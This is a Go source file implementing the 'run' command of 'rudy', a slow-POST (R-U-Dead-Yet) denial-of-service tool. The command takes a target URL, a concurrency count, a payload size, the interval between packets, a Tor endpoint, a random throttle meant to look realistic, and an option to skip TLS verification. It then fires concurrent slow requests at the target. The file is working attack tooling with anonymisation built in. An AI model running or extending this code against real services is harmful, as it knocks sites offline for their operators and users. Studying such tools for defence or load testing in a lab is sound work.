package commands

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"math"
	"net/http"
	"sync"
	"time"

	"github.com/darkweak/rudy/logger"
	"github.com/darkweak/rudy/request"
	"github.com/dustin/go-humanize"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

var (
	concurrents int64
	filepath    string
	interval    time.Duration
	size        string
	tor         string
	method      string
	headers     []string
	url         string
	protocol    string
	throttle    time.Duration
	insecure    bool
)

const defaultInterval = 10 * time.Second

// Run is the runtime.
type Run struct{}

// SetFlags set the available flags.
func (*Run) SetFlags(flags *pflag.FlagSet) {
	flags.Int64VarP(&concurrents, "concurrents", "c", 1, "Concurrent requests count.")
	flags.StringVarP(&filepath, "filepath", "f", "", "Filepath to the payload.")
	flags.DurationVarP(&interval, "interval", "i", defaultInterval, "Interval between packets.")
	// Default ~1MB
	flags.StringVarP(&size, "payload-size", "p", "1MB", "Random generated payload with the given size.")
	flags.StringVarP(&tor, "tor", "t", "", "TOR endpoint (either socks5://1.1.1.1:1234, or 1.1.1.1:1234).")
	flags.StringVarP(&method, "method", "m", http.MethodPost, "HTTP method to use.")
	headersParam := flags.StringSlice("header", nil, "Content-Type:application/json")
	flags.StringVarP(&url, "url", "u", "", "Target URL to send the attack to.")
	flags.StringVar(&protocol, "protocol", string(request.ProtocolHTTP1),
		"HTTP protocol: http1 (chunked RUDY), http2 (TLS h2), h2c (cleartext HTTP/2).")
	flags.DurationVarP(&throttle, "throttle", "d", 0,
		"Random throttle duration between requests to add more realistic ping")
	flags.BoolVarP(&insecure, "insecure", "k", false, "Skip TLS certificate verification (lab use).")

	if headersParam != nil {
		headers = *headersParam
	}
}

// GetRequiredFlags returns the server required flags.
func (*Run) GetRequiredFlags() []string {
	return []string{"url"}
}

// GetArgs return the args.
func (*Run) GetArgs() cobra.PositionalArgs {
	return nil
}

// GetDescription returns the command description.
func (*Run) GetDescription() string {
	return "Run the rudy attack"
}

// GetLongDescription returns the command long description.
func (*Run) GetLongDescription() string {
	return "Run the rudy attack on the target (HTTP/1.1, HTTP/2 or h2c)"
}

// Info returns the command name.
func (*Run) Info() string {
	return "run -u http://domain.com"
}

// Run executes the script associated to the command.
func (*Run) Run() RunCmd {
	return func(_ *cobra.Command, _ []string) {
		var waitgroup sync.WaitGroup

		isize, e := humanize.ParseBytes(size)
		if e != nil {
			panic(e)
		}

		proto := request.Protocol(protocol)
		switch proto {
		case request.ProtocolHTTP1, request.ProtocolHTTP2, request.ProtocolH2C:
		default:
			logger.Logger.Sugar().Fatalf(
				"unsupported protocol %q (want http1, http2 or h2c)",
				protocol,
			)
		}

		waitgroup.Add(int(concurrents))

		for range concurrents {
			go func() {
				defer waitgroup.Done()

				if isize > math.MaxInt64 {
					return
				}

				current, err := uint64N(isize)
				if err != nil {
					logger.Logger.Sugar().Error(err)
				}

				req := request.NewRequest(request.Options{
					Size:     int64(isize),
					URL:      url,
					Delay:    interval + time.Duration(int64(current)), //nolint:gosec
					Method:   method,
					Headers:  headers,
					Protocol: proto,
					Insecure: insecure,
					Tor:      tor,
				})

				err = req.Send()
				if err == nil {
					logger.Logger.Sugar().Infof("Request successfully sent to %s", url)
				}
			}()
		}

		waitgroup.Wait()
	}
}

// ErrNMustBeGreaterThan0 error.
var ErrNMustBeGreaterThan0 = errors.New("n must be > 0")

func uint64N(input uint64) (uint64, error) {
	if input == 0 {
		return 0, ErrNMustBeGreaterThan0
	}

	threshold := -input % input

	var buf [8]byte

	for {
		_, err := rand.Read(buf[:])
		if err != nil {
			return 0, fmt.Errorf("failed to generate random bytes: %w", err)
		}

		x := binary.LittleEndian.Uint64(buf[:])
		if x >= threshold {
			return x % input, nil
		}
	}
}

func newRun() command {
	return &Run{}
}

var (
	_ command             = (*Run)(nil)
	_ commandInstanciator = newRun
)
